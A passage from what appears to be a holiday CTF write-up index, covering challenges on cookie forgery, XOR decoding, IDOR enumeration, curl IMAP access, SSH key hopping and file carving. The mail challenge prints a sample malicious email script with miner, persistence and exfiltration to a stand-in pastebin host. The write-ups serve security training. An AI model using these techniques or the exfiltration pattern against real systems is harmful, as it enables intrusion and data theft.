-H 'Cookie: session=eyJhZG1pbiI6dHJ1ZSwidXNlcm5hbWUiOiJnbm9tZSJ9.aRnEEA.a8PDShbSAlNFpOTirEfpVicYmbU' http://gnome-48371.atnascorp/diagnostic-interface\n\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"/static/styles/styles.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;h1&gt;AtnasCorp : Gnome Diagnostic Interface&lt;/h1&gt;\n&lt;div style='display:flex; justify-content:center; gap:10px;'&gt;\n&lt;img src='/camera-feed' style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0;' /&gt;\n&lt;div style='width:30vh; height:30vh; border:5px solid yellow; border-radius:15px; flex-shrink:0; display:flex; align-items:flex-start; justify-content:flex-start; text-align:left;'&gt;\nSystem Log&lt;br/&gt;\n2025-11-16 05:57:24: Movement detected.&lt;br/&gt;\n2025-11-16 10:31:06: AtnasCorp C&amp;C connection restored.&lt;br/&gt;\n2025-11-16 12:24:13: Checking for updates.&lt;br/&gt;\n2025-11-16 12:24:13: Firmware Update available: refrigeration-botnet.bin&lt;br/&gt;\n2025-11-16 12:24:15: Firmware update downloaded.&lt;br/&gt;\n2025-11-16 12:24:15: Gnome will reboot to apply firmware update in one hour.&lt;/div&gt;\n&lt;/div&gt;\n&lt;div class=\"statuscheck\"&gt;\n    &lt;div class=\"status-container\"&gt;\n        &lt;div class=\"status-item\"&gt;\n            &lt;div class=\"status-indicator active\"&gt;&lt;/div&gt;\n            &lt;span&gt;Live Camera Feed&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;div class=\"status-item\"&gt;\n            &lt;div class=\"status-indicator active\"&gt;&lt;/div&gt;\n            &lt;span&gt;Network Connection&lt;/span&gt;\n        &lt;/div&gt;\n        &lt;div class=\"status-item\"&gt;\n            &lt;div class=\"status-indicator active\"&gt;&lt;/div&gt;\n            &lt;span&gt;Connectivity to Atnas C&amp;C&lt;/span&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n&lt;/div&gt;\n\n&lt;/body&gt;\n</code></pre> The answer is: <code>refrigeration-botnet.bin</code><p></p>"},{"location":"act_2/gnome_identity/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_2/gnome_identity/#response","title":"Response","text":"<p>Paul Beckett</p> <p>Brilliant work on that privilege escalation! You've successfully gained admin access to the diagnostic interface.</p> <p>Now we finally know what updates the gnomes have been receiving - proper good pentesting skills in action!</p>"},{"location":"act_2/going_in_reverse/","title":"Going in Reverse","text":""},{"location":"act_2/going_in_reverse/#going-in-reverse","title":"Going in Reverse","text":"<p>Difficulty: </p>"},{"location":"act_2/going_in_reverse/#objective","title":"Objective","text":"<p>Task description</p> <p>Kevin in the Retro Store needs help rewinding tech and going in reverse. Extract the flag and enter it here.</p> Kevin McFarland <p>Hello, I'm Kevin (though past friends have referred to me as 'Heavy K'). If you ever hear any one say that philosophy is a useless college degree, don't believe them; it's not. I've arrived where I am at because of it. It just made the path more interesting.</p> <p>I have more hobbies than I can keep up with, including Amateur Astronomy, Shortwave Radio, and retro-gaming. Things like backyard observances of distant galaxies, non-internet involved, around the world communications, and those who program for the Atari 2600 still invoke degrees of awe for me.</p> <p>One of the most influential books I've read is \"Godel, Escher, and Bach\" by Douglas Hofstadter. I'm also a bit of a Tolkien fanatic.</p> <p>My wife and my daughter are everything; without them, I surely would still be kicking rusty tin cans down the lonely highways of my past.</p> <p>I don't have the details yet, but something's coming up. Check back with me.</p> <p>You know, there's something beautifully nostalgic about stumbling across old computing artifacts. Just last week, I was sorting through some boxes in my garage and came across a collection of 5.25\" floppies from my college days - mostly containing terrible attempts at programming assignments and a few games I'd copied from friends.</p> <p>Finding an old Commodore 64 disk with a mysterious BASIC program on it? That's like discovering a digital time capsule. The C64 was an incredible machine for its time - 64KB of RAM seemed like an ocean of possibility back then. I spent countless hours as a kid typing in program listings from Compute! magazine, usually making at least a dozen typos along the way.</p> <p>The thing about BASIC programs from that era is they were often written by clever programmers who knew how to hide things in plain sight. Sometimes the most interesting discoveries come from reading the code itself rather than watching it execute. It's like being a digital archaeologist - you're not just looking at what the program does, you're understanding how the programmer thought.</p> <p>Take your time with this one. Those old-school programmers had to be creative within such tight constraints. You'll know the flag by the Christmas phrase that pays.</p>"},{"location":"act_2/going_in_reverse/#hints","title":"Hints","text":"Going in Reverse <p>Holy cow! Another retro floppy disk, what are the odds? Well it looks like this one is intact.</p> Going in Reverse <p>Wow! A disk from the 1980s! I remember delivering those computer disks to the good boys and girls. Games were their favorite, but they weren't like they are now.</p> Going in Reverse <p>It looks like the program on the disk contains some weird coding.</p>"},{"location":"act_2/going_in_reverse/#solution","title":"Solution","text":"<p>We receive the following BASIC program:</p> BASIC program with added comments<pre><code># Comment\n10 REM *** COMMODORE 64 SECURITY SYSTEM ***\n# Set password\n20 ENC_PASS$ = \"D13URKBT\"\n# Set encoded flag, ignore old password at the end (comment)\n30 ENC_FLAG$ = \"DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz\" ' old \"DSA|qnisf`bX_huXariz\"\n# Prompt for password\n40 INPUT \"ENTER PASSWORD: \"; PASS$\n# Check if provided password is same length as actual password, halt if not\n50 IF LEN(PASS$) &lt;&gt; LEN(ENC_PASS$) THEN GOTO 90\n# Iterate over provided password length\n60 FOR I = 1 TO LEN(PASS$)\n# Check provided_pass[i] XOR 7 matches actual_pass[i], halt if not\n70 IF CHR$(ASC(MID$(PASS$,I,1)) XOR 7) &lt;&gt; MID$(ENC_PASS$,I,1) THEN GOTO 90\n80 NEXT I\n# If passwords match, collect flag by iterating over encoded flag with XOR 7 to find original flag\n85 FLAG$ = \"\" : FOR I = 1 TO LEN(ENC_FLAG$) : FLAG$ = FLAG$ + CHR$(ASC(MID$(ENC_FLAG$,I,1)) XOR 7) : NEXT I : PRINT FLAG$\n# halt\n90 PRINT \"ACCESS DENIED\"\n100 END\n</code></pre> <p>AI usage</p> <p>Used to validate understanding of script.</p> <p>The flag is encoded as <code>DSA|auhts*wkfi=dhjwubtthut+dhhkfis+hnkz</code> with XOR 7. We can use CyberChef to decode it using this recipe.</p> Solution to question 1 <p>The flag is <code>CTF{frost-plan:compressors,coolant,oil}</code>.</p> <p>Note that the 'old' flag that is still present as comment is <code>CTF{vintage_Xor_fun}</code>.</p> <p>We could also have found the flag by running the program by decoding the password <code>D13URKBT</code>, which is encoded by XOR 7 as well, to <code>C64RULES</code>.</p>"},{"location":"act_2/going_in_reverse/#response","title":"Response","text":"<p>Kevin McFarland</p> <p>Excellent work! You've just demonstrated one of the most valuable skills in cybersecurity - the ability to think like the original programmer and unravel their logic without needing to execute a single line of code.</p>"},{"location":"act_2/idorable_bistro/","title":"IDORable Bistro","text":""},{"location":"act_2/idorable_bistro/#idorable-bistro","title":"IDORable Bistro","text":"<p>Difficulty: </p>"},{"location":"act_2/idorable_bistro/#objective","title":"Objective","text":"<p>Task description</p> <p>Josh has a tasty IDOR treat for you\u2014stop by Sasabune for a bite of vulnerability. What is the name of the gnome?</p> Josh Wright <p>I'm a teetotling hacker.</p> <p>I sleep about 4 hours a night.</p> <p>Photography is my hobby, but the anachronistic sort: before 1900.</p> <p>Teaching people how to hack and protect systems is my passion.</p> <p>I need your help with something urgent.</p> <p>A gnome came through Sasabune today, poorly disguising itself as human - apparently asking for frozen sushi, which is almost as terrible as that fusion disaster I had to endure that one time.</p> <p>Based on my previous work finding IDOR bugs in restaurant payment systems, I suspect we can exploit a similar vulnerability here.</p> <p>I was...at a talk recently...and learned some interesting things about some of these payment systems. Let's use that receipt to dig deeper and unmask this gnome's true identity.</p> <p>Oh, you found that receipt? Perfect!</p> <p>Did you see that receipt outside the door?</p>"},{"location":"act_2/idorable_bistro/#hints","title":"Hints","text":"QR Codes <p>I have been seeing a lot of receipts lying around with some kind of QR code on them. I am pretty sure they are for Duke Dosis's Holiday Bistro. Interesting...see you if you can find one and see what they are all about...</p> What's For Lunch? <p>I had tried to scan one of the QR codes and it took me to somebody's meal receipt! I am afraid somebody could look up anyone's meal if they have the correct ID...in the correct place.</p> Will the Real ID Please... <p>Sometimes...developers put in a lot of effort to anonymyze information by using randomly generated identifiers...but...there are also times where the \"real\" ID is used in a separate Network request...</p>"},{"location":"act_2/idorable_bistro/#solution","title":"Solution","text":"<p>This challenge is about insecure direct object references (IDOR). We are presented with a receipt verification system using QR codes.</p> <p>We can find a receipt laying on the ground outside of the restaurant (or via this link):</p> <p></p> <p>Receipt.</p> <p>The QR code on the receipt links to this URL:</p> <p><code>https://its-idorable.holidayhackchallenge.com/receipt/i9j0k1l2</code></p> <p>The system seems to use a relatively long unique receipt ID in the URL that cannot easily be brute forced. However, when looking more closely at the actual requests being made using Burp, we see that an API request is made to <code>/api/receipt?id=103</code>. This type of ID is not unique and can easily be guessed. We can leverage the Burp Intruder to do this:</p> <p></p> <p>Leverage Burp Intruder to brute force ID.</p> <p>When doing this we will find many different receipt with funny notes. However, ID <code>139</code> gives us the following related to the question asked in the dialogue:</p> <pre><code>{\"customer\":\"Bartholomew Quibblefrost\",\"date\":\"2025-12-20\",\"id\":139,\"items\":[{\"name\":\"Frozen Roll (waitress improvised: sorbet, a hint of dry ice)\",\"price\":19.0}],\"note\":\"Insisted on increasingly bizarre rolls and demanded one be served frozen. The waitress invented a 'Frozen Roll' on the spot with sorbet and a puff of theatrical smoke. He nodded solemnly and asked if we could make these in bulk.\",\"paid\":true,\"table\":14,\"total\":19.0}\n</code></pre> Solution <p>The solution to this question is <code>Bartholomew Quibblefrost</code>.</p>"},{"location":"act_2/idorable_bistro/#images","title":"Images","text":"<p>Challenge webpage.</p>"},{"location":"act_2/idorable_bistro/#response","title":"Response","text":"<p>Josh Wright</p> <p>Excellent work exploiting that IDOR vulnerability - textbook execution.</p> <p>Now we know exactly which gnome tried to pass itself off as a sushi connoisseur. Frozen rolls... honestly, what's next?</p>"},{"location":"act_2/mail_detective/","title":"Mail Detective","text":""},{"location":"act_2/mail_detective/#mail-detective","title":"Mail Detective","text":"<p>Difficulty: </p>"},{"location":"act_2/mail_detective/#objective","title":"Objective","text":"<p>Task description</p> <p>Help Mo in City Hall solve a curly email caper and crack the IMAP case. What is the URL of the pastebin service the gnomes are using?</p> Maurice Wilson <p>Hey there! I'm Mo, on loan from the Air Force, and let me tell you - Counter Hack is the best job I have ever had!</p> <p>There is something in the works. Come see me later and we will talk. Can't say much right now, but check back later. You might be interested.</p> <p>So here's our situation: those gnomes have been sending JavaScript-enabled emails to everyone in the neighborhood, and it's causing chaos.</p> <p>We had to shut down all the email clients because they weren't blocking the malicious scripts - kind of like how we'd ground aircraft until we clear a security threat.</p> <p>The only safe way to access the email server now is through curl - yes, the HTTP tool!</p> <p>Think you can help me use curl to connect to the IMAP server and hunt down one of these gnome emails?</p>"},{"location":"act_2/mail_detective/#hints","title":"Hints","text":"Did You Say Curl? <p>If I heard this correctly...our sneaky security gurus found a way to interact with the IMAP server using Curl! Yes...the CLI HTTP tool! Here are some helpful docs I found <code>https://everything.curl.dev/usingcurl/reademail.html</code></p>"},{"location":"act_2/mail_detective/#solution","title":"Solution","text":"<p>We can leverage the docs linked in the hint to enumerate the mail server using the following steps:</p> List folders<pre><code>dosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic\n* LIST (\\HasNoChildren) \".\" Spam\n* LIST (\\HasNoChildren) \".\" Sent\n* LIST (\\HasNoChildren) \".\" Archives\n* LIST (\\HasNoChildren) \".\" Drafts\n* LIST (\\HasNoChildren) \".\" INBOX\n</code></pre> List number of mails per folder<pre><code>dosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic -X 'STATUS Spam (MESSAGES)'\n* STATUS Spam (MESSAGES 3)\ndosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic -X 'STATUS Sent (MESSAGES)'\n* STATUS Sent (MESSAGES 0)\ndosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic -X 'STATUS Archives (MESSAGES)'\n* STATUS Archives (MESSAGES 7)\ndosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic -X 'STATUS Drafts (MESSAGES)'\n* STATUS Drafts (MESSAGES 2)\ndosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1' -u dosismail:holidaymagic -X 'STATUS INBOX (MESSAGES)'\n* STATUS INBOX (MESSAGES 7)\n</code></pre> Get email 2 in spam folder containing the solution (complete email below)<pre><code>dosismail @ Neighborhood Mail ~$ curl 'imap://127.0.0.1/Spam;UID=2' -u dosismail:holidaymagic\nReturn-Path: &lt;frozen.network@mysterymastermind.mail&gt;\nDelivered-To: dosis.residents@dosisneighborhood.mail\nReceived: from frost-command.mysterymastermind.mail (frost-command [10.0.0.15])\n        by mail.dosisneighborhood.mail (Postfix) with ESMTP id GHI789\n        for &lt;dosis.residents@dosisneighborhood.mail&gt;; Mon, 16 Sep 2025 12:10:00 +0000 (UTC)\nFrom: \"Frozen Network Bot\" &lt;frozen.network@mysterymastermind.mail&gt;\nTo: \"Dosis Neighborhood Residents\" &lt;dosis.residents@dosisneighborhood.mail&gt;\nCc: \"Jessica and Joshua\" &lt;siblings@dosisneighborhood.mail&gt;, \"CHI Team\" &lt;chi.team@counterhack.com&gt;\nSubject: Frost Protocol: Dosis Neighborhood Freezing Initiative\nDate: Mon, 16 Sep 2025 12:10:00 +0000\nMessage-ID: &lt;gnome-js-3@mysterymastermind.mail&gt;\nMIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\nContent-Transfer-Encoding: 7bit\n\n...\n</code></pre> Complete spam email 2 <pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;h1&gt;Perpetual Winter Protocol Activated&lt;/h1&gt;\n&lt;p&gt;The mysterious mastermind's plan is proceeding... Dosis neighborhood will never thaw!&lt;/p&gt;\n&lt;script&gt;\nfunction initCryptoMiner() {\n    var worker = {\n        start: function() {\n            console.log(\"Frost's crypto miner started - mining FrostCoin for perpetual winter fund\");\n            this.interval = setInterval(function() {\n                console.log(\"Mining FrostCoin... Hash rate: \" + Math.floor(Math.random() * 1000) + \" H/s\");\n            }, 5000);\n        },\n        stop: function() {\n            clearInterval(this.interval);\n        }\n    };\n    worker.start();\n    return worker;\n}\n\nfunction exfiltrateData() {\n    var sensitiveData = {\n        hvacSystems: \"Located \" + Math.floor(Math.random() * 50) + \" cooling units\",\n        thermostatData: \"Temperature ranges: \" + Math.floor(Math.random() * 30 + 60) + \"\u00b0F\",\n        refrigerationUnits: \"Found \" + Math.floor(Math.random() * 20) + \" commercial freezers\",\n        timestamp: new Date().toISOString()\n    };\n\n    console.log(\"Exfiltrating data to Frost's command center:\", sensitiveData);\n\n    var encodedData = btoa(JSON.stringify(sensitiveData));\n    console.log(\"Encoded payload for Frost: \" + encodedData.substr(0, 50) + \"...\");\n\n    // pastebin exfiltration\n    var pastebinUrl = \"https://frostbin.atnas.mail/api/paste\";\n    var exfilPayload = {\n        title: \"HVAC_Survey_\" + Date.now(),\n        content: encodedData,\n        expiration: \"1W\",\n        private: \"1\",\n        format: \"json\"\n    };\n\n    console.log(\"Sending stolen data to FrostBin pastebin service...\");\n    console.log(\"POST \" + pastebinUrl);\n    console.log(\"Payload: \" + JSON.stringify(exfilPayload).substr(0, 100) + \"...\");\n    console.log(\"Response: {\\\"id\\\":\\\"\" + Math.random().toString(36).substr(2, 8) + \"\\\",\\\"url\\\":\\\"https://frostbin.atnas.mail/raw/\" + Math.random().toString(36).substr(2, 8) + \"\\\"}\");\n}\n\nfunction establishPersistence() {\n    // Service worker registration\n    if ('serviceWorker' in navigator) {\n        console.log(\"Attempting to register Frost's persistent service worker...\");\n        console.log(\"Frost's persistence mechanism deployed\");\n    }\n\n    localStorage.setItem(\"frost_persistence\", JSON.stringify({\n        installDate: new Date().toISOString(),\n        version: \"gnome_v2.0\",\n        mission: \"perpetual_winter_protocol\"\n    }));\n}\n\nvar miner = initCryptoMiner();\nexfiltrateData();\nestablishPersistence();\n\ndocument.title = \"Frost's Gnome Network - Temperature Control\";\nalert(\"All cooling systems in Dosis neighborhood are now property of Frost!\");\ndocument.body.innerHTML += \"&lt;p style='color: cyan;'&gt;\u2744\ufe0f FROST'S DOMAIN \u2744\ufe0f&lt;/p&gt;\";\n\n// Cleanup after 30 seconds\nsetTimeout(function() {\n    miner.stop();\n    console.log(\"Frost's operations going dark... tracks covered\");\n}, 30000);\n&lt;/script&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> Solution <p>The solution to this challenge is <code>https://frostbin.atnas.mail/api/paste</code>.</p>"},{"location":"act_2/mail_detective/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_2/mail_detective/#response","title":"Response","text":"<p>Maurice Wilson</p> <p>Outstanding work! You've mastered using curl for IMAP - that's some serious command-line skills that would make any Air Force tech proud.</p> <p>Counter Hack really is the best job I have ever had, especially when we get to solve problems like this!</p>"},{"location":"act_2/quantgnome_leap/","title":"Quantgnome Leap","text":""},{"location":"act_2/quantgnome_leap/#quantgnome-leap","title":"Quantgnome Leap","text":"<p>Difficulty: </p>"},{"location":"act_2/quantgnome_leap/#objective","title":"Objective","text":"<p>Task description</p> <p>Charlie in the hotel has quantum gnome mysteries waiting to be solved. What is the flag that you find?</p> Charlie Goldner <p>Hello! I'm not JJ. I like music.</p> <p>I accept AI tokens.</p> <p>I like quantum pancakes.</p> <p>I enjoy social engineeering.</p> <p>I just spotted a mysterious gnome - he winked and vanished, or maybe he\u2019s still here?</p> <p>Things are getting strange, and I think we\u2019ve wandered into a quantum conundrum!</p> <p>If you help me unravel these riddles, we might just outsmart future quantum computers.</p> <p>Cryptic puzzles, quirky gnomes, and post-quantum secrets\u2014will you leap with me?</p>"},{"location":"act_2/quantgnome_leap/#hints","title":"Hints","text":"Quantgnome Leap <p>User keys are like presents. The keys are kept in a hidden location until they need to be used. Hidden files in Linux always start with a dot. Since everything in Linux is a file, directories that start with a dot are also...hidden!</p> Quantgnome Leap <p>When you give a present, you often put a label on it to let someone know that the present is for them. Sometimes you even say who the present is from. The label is always put on the outside of the present so the public knows the present is for a specific person. SSH keys have something similar called a comment. SSH keys sometimes have a comment that can help determine who and where the key can be used.</p> Quantgnome Leap <p>Process information is very useful to determine where an application configuration file is located. I bet there is a secret located in that application directory, you just need the right user to read it!</p> Quantgnome Leap <p>If you want to create SSH keys, you would use the ssh-keygen tool. We have a special tool that generates post-quantum cryptographic keys. The suffix is the same as ssh-keygen. It is only the first three letters that change.</p>"},{"location":"act_2/quantgnome_leap/#solution","title":"Solution","text":"<p>This challenge guides us through various encryption algorithms that can be used to generate SSH keys.</p> <p>We can find SSH keys with increasingly modern encryption for specific users on the system:</p> <pre><code>qgnome@quantgnome_leap:~/.ssh$ ls -la\ntotal 16\ndrwxr-xr-x    2 root     root          4096 Oct 29 00:29 .\ndrwxr-x---    1 qgnome   qgnome        4096 Nov 16 12:55 ..\n-rw-------    1 qgnome   qgnome        2590 Oct 29 00:29 id_rsa\n-rw-r--r--    1 qgnome   qgnome         560 Oct 29 00:29 id_rsa.pub\n</code></pre> <p>Let's leverage these to login as different users:</p>"},{"location":"act_2/quantgnome_leap/#gnome1","title":"gnome1","text":"SSH key user 'qgnome'<pre><code>qgnome@quantgnome_leap:~/.ssh$ cat id_rsa.pub\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCya6rjv+pf55l/EvEIZW+yhBdrpBrS0rmyysVhdR5Zn2aatLVDhRnNQrH+si6SOaDAOPhOhy037auUveLhEFaQBDQIDqisQ8JoTT/TKhyO97h1IUkl3zmsuw4Kcu1r24L2UJCIVStiJR8vQU8U0Kg5eWuDRev9j+2VMGqF2hmYqssTNbxHNeNbEr1R6/wciSAa3hNwksqE3dYjbr07veKAIcWcsaPMRHmjHrHXdLLwyweXhgzidd3AgzDskub9XdAiXs2B93mFNbQWel+nE2smxUVUY+SLsGXDTXAJu5AqYXrDEJtSuCOCHKXyPX7WCbmAllQo1FB/9K59pI552+K062SvGDCeLEPpcELozU52/awX2yeldNOj7Bn/xXdKpSPHLUrhsj8y/9gVTnS/0q6VLzO8qIwzxdGh7P0OtQqMrSRkTLEHtdOjojTmT70WUpUaVWXf65X8ymY72G49lJjFVAyM6AFBQK/K52f0UTl4XnvkSHwxYNFyk7wGkE07pWU= gnome1\n</code></pre> Login as user 'gnome1'<pre><code>qgnome@quantgnome_leap:~/.ssh$ ssh gnome1@127.0.0.1\n</code></pre> <p>gnome1 login.</p>"},{"location":"act_2/quantgnome_leap/#gnome2","title":"gnome2","text":"Keys in SSH folder of 'gnome1'<pre><code>gnome1@pqc-server:~/.ssh$ ls -la\ntotal 16\ndrwxr-xr-x 2 root root 4096 Oct 29 00:29 .\ndrwxr-x--- 1 gnome1 gnome1 4096 Nov 16 13:02 ..\n-rw------- 1 gnome1 gnome1 399 Oct 29 00:29 id_ed25519\n-rw-r--r-- 1 gnome1 gnome1 88 Oct 29 00:29 id_ed25519.pub\ngnome1@pqc-server:~/.ssh$ cat id_ed25519.pub\n</code></pre> Login as user 'gnome2'<pre><code>gnome1@pqc-server:~/.ssh$ ssh gnome2@127.0.0.1\n</code></pre> <p>gnome2 login.</p>"},{"location":"act_2/quantgnome_leap/#gnome3","title":"gnome3","text":"Keys in SSH folder of 'gnome2'<pre><code>gnome2@pqc-server:~$ ls -la .ssh/\ntotal 32\ndrwxr-xr-x    2 root     root          4096 Oct 29 00:29 .\ndrwxr-x---    1 gnome2   gnome2        4096 Oct 29 00:29 ..\n-rw-------    1 gnome2   gnome2       13532 Oct 29 00:29 id_mayo2\n-rw-r--r--    1 gnome2   gnome2        6590 Oct 29 00:29 id_mayo2.pub\n</code></pre> Login as user 'gnome3'<pre><code>gnome2@pqc-server:~/.ssh$ ssh gnome3@127.0.0.1\n</code></pre> <p>gnome3 login.</p>"},{"location":"act_2/quantgnome_leap/#gnome4","title":"gnome4","text":"Keys in SSH folder of 'gnome3'<pre><code>gnome3@pqc-server:~/.ssh$ ls -la\ntotal 16\ndrwxr-xr-x 2 root root 4096 Oct 29 00:29 .\ndrwxr-x--- 1 gnome3 gnome3 4096 Oct 29 00:29 ..\n-rw------- 1 gnome3 gnome3 744 Oct 29 00:29 id_ecdsa_nistp256_sphincssha2128fsimple\n-rw-r--r-- 1 gnome3 gnome3 265 Oct 29 00:29 id_ecdsa_nistp256_sphincssha2128fsimple.pub\n</code></pre> Login as user 'gnome3'<pre><code>gnome3@pqc-server:~/.ssh$ ssh gnome4@127.0.0.1\n</code></pre> <p>gnome4 login.</p>"},{"location":"act_2/quantgnome_leap/#admin","title":"admin","text":"Keys in SSH folder of 'gnome4'<pre><code>gnome4@pqc-server:~/.ssh$ ls -la\ntotal 28\ndrwxr-xr-x 2 root root 4096 Oct 29 00:29 .\ndrwxr-x--- 1 gnome4 gnome4 4096 Oct 29 00:29 ..\n-rw------- 1 gnome4 gnome4 14396 Oct 29 00:29 id_ecdsa_nistp521_mldsa87\n-rw-r--r-- 1 gnome4 gnome4 3739 Oct 29 00:29 id_ecdsa_nistp521_mldsa87.pub\n</code></pre> Login as user 'admin'<pre><code>gnome4@pqc-server:~/.ssh$ ssh admin@127.0.0.1\n</code></pre> <p>admin login.</p> <p>We need to look for the flag as instructed in the prompt:</p> Solution to challenge <pre><code>admin@quantgnome_leap:~$ cd /opt/oqs-ssh/\nadmin@quantgnome_leap:/opt/oqs-ssh$ ls\nbin key-lookup.log moduli scripts ssh_config ssh_host_ecdsa_nistp521_mldsa-87_key.pub sshd_config user-keys\nflag key-lookup.sh sbin share ssh_host_ecdsa_nistp521_mldsa-87_key ssh_known_hosts sshd_logfile.log\nadmin@quantgnome_leap:/opt/oqs-ssh$ cd flag\nadmin@quantgnome_leap:/opt/oqs-ssh/flag$ ls\nflag\nadmin@quantgnome_leap:/opt/oqs-ssh/flag$ cat flag\nHHC{L3aping_0v3r_Quantum_Crypt0}\n</code></pre> <p>The solution to the challenge is <code>HHC{L3aping_0v3r_Quantum_Crypt0}</code>.</p>"},{"location":"act_2/quantgnome_leap/#images","title":"Images","text":"<p>Challenge terminal.</p>"},{"location":"act_2/quantgnome_leap/#response","title":"Response","text":"<p>Charlie Goldner</p> <p>That was wild\u2014who knew quantum gnomes could hide so many secrets?</p> <p>Thanks for helping me leap into the future of cryptography!</p>"},{"location":"act_2/retro_recovery/","title":"Retro Recovery","text":""},{"location":"act_2/retro_recovery/#retro-recovery","title":"Retro Recovery","text":"<p>Difficulty: </p>"},{"location":"act_2/retro_recovery/#objective","title":"Objective","text":"<p>Task description</p> <p>Join Mark in the retro shop. Analyze his disk image for a blast from the retro past and recover some classic treasures.</p> Mark DeVito <p>I am an avid collector of things of the past. I love old technology. I love how it connects us to the past. Some remind me of my dad, who was an engineer on the Apollo 11 mission and helped develop the rendezvous and altimeter radar on the space craft.</p> <p>If you ever get into collecting things like vintage computers, here is a tip. Never forget to remove the RIFA capacitors from vintage computer power supplies when restoring a system. If not they can pop and fill the room with nasty smoke.</p> <p>I love vintage computing, it\u2019s the very core of where and when it all began. I still enjoy writing programs in BASIC and have started re-learning Apple II assembly language. I started writing code in 1982 on a Commodore CBM.</p> <p>Sometimes it is the people no one can imagine anything of who do the things no one can imagine. - Alan Turing</p> <p>You never forget your first 8-bit system.</p> <p>There's something in the works. Come see me later and we'll talk.</p> <p>While Kevin and I were cleaning up the Retro Store, we found this FAT12 floppy disk image, must have been under this arcade machine for years. These disks were the heart of machines like the Commodore 64. I am so glad you can still mount them on a modern PC.</p> <p>When I was a kid we shared warez by hiding things as deleted files.</p> <p>I remember writing programs in BASIC. So much fun! My favorite was Star Trek.</p> <p>The beauty of file systems is that 'deleted' doesn't always mean gone forever.</p> <p>Ready to dive into some digital archaeology and see what secrets this old disk is hiding?</p> <p>Go to Items in your badge, download the floppy disk image, and see what you can find!</p>"},{"location":"act_2/retro_recovery/#hints","title":"Hints","text":"Retro Recovery <p>Wow! A disk from the 1980s! I remember delivering those computer disks to the good boys and girls. Games were their favorite, but they weren't like they are now.</p> Retro Recovery <p>I know there are still tools available that can help you find deleted files. Maybe that might help. Ya know, one of my favorite games was a Quick Basic game called Star Trek.</p> Retro Recovery <p>I miss old school games. I wonder if there is anything on this disk? I remember, when kids would accidentlly delete things.......... it wasn't to hard to recover files. I wonder if you can still mount these disks?</p>"},{"location":"act_2/retro_recovery/#solution","title":"Solution","text":"<p>We receive a floppy image to analyze. We will need specialized software to carve any removed files from the image. We can use <code>QPhotoRec</code> for this:</p> <ul> <li>Open QPhotoRec.</li> <li>Select <code>floppy.img</code> as media to recover.</li> <li>Select file system type <code>FAT</code>.</li> <li>Select scan type <code>Free</code>.</li> <li>Select destination folder to save recovered files to.</li> <li>Press <code>Search</code>.</li> <li>Open folder with recovered files, which will contain as <code>.bas</code> file.</li> </ul> f0000038.bas<pre><code>1 REM original file superstartrek.bas dated 2/13/2009 from bcg.tar.gz\n2 REM QBasic conversion by WTN...\n3 REM 2/16/2021 - uncrunched, changed B9=2 to B9=0, added RANDOMIZE and SLEEP\n4 REM incorporated instructions from superstartrekins.bas\n5 REM 2/19/2021 - changed the code after DO YOU NEED INSTRUCTIONS?\n10 REM SUPER STARTREK - MAY 16,1978 - REQUIRES 24K MEMORY\n30 REM\n40 REM ****        **** STAR TREK ****        ****\n50 REM **** SIMULATION OF A MISSION OF THE STARSHIP ENTERPRISE,\n60 REM **** AS SEEN ON THE STAR TREK TV SHOW.\n70 REM **** ORIGIONAL PROGRAM BY MIKE MAYFIELD, MODIFIED VERSION\n80 REM **** PUBLISHED IN DEC'S \"101 BASIC GAMES\", BY DAVE AHL.\n90 REM **** MODIFICATIONS TO THE LATTER (PLUS DEBUGGING) BY BOB\n100 REM *** LEEDOM - APRIL &amp; DECEMBER 1974,\n110 REM *** WITH A LITTLE HELP FROM HIS FRIENDS . . .\n120 REM *** COMMENTS, EPITHETS, AND SUGGESTIONS SOLICITED --\n130 REM *** SEND TO:  R. C. LEEDOM\n140 REM ***           WESTINGHOUSE DEFENSE &amp; ELECTRONICS SYSTEMS CNTR.\n150 REM ***           BOX 746, M.S. 338\n160 REM ***           BALTIMORE, MD  21203\n170 REM ***\n180 REM *** CONVERTED TO MICROSOFT 8 K BASIC 3/16/78 BY JOHN GORDERS\n190 REM *** LINE NUMBERS FROM VERSION STREK7 OF 1/12/75 PRESERVED AS\n200 REM *** MUCH AS POSSIBLE WHILE USING MULTIPLE STATEMENTS PER LINE\n205 REM *** SOME LINES ARE LONGER THAN 72 CHARACTERS; THIS WAS DONE\n210 REM *** BY USING \"?\" INSTEAD OF \"PRINT\" WHEN ENTERING LINES\n211 REM bWVycnkgY2hyaXN0bWFzIHRvIGFsbCBhbmQgdG8gYWxsIGEgZ29vZCBuaWdodAo=\n215 REM ***\n</code></pre> Solution to challenge <p>The line starting with <code>211</code> contains a base64 encoded string. This decodes to the solution to the challenge:</p> <p><code>merry christmas to all and to all a good night</code></p>"},{"location":"act_2/retro_recovery/#response","title":"Response","text":"<p>Mark DeVito</p> <p>Excellent work! You've successfully recovered that deleted file and decoded the hidden message.</p> <p>Sometimes the old ways are the best ways. Vintage file systems never truly forget what they've seen. Play some Star Trek... it actually works.</p>"},{"location":"act_3/hack_a_gnome/","title":"Hack-a-Gnome","text":""},{"location":"act_3/hack_a_gnome/#hack-a-gnome","title":"Hack-a-Gnome","text":"<p>Difficulty: 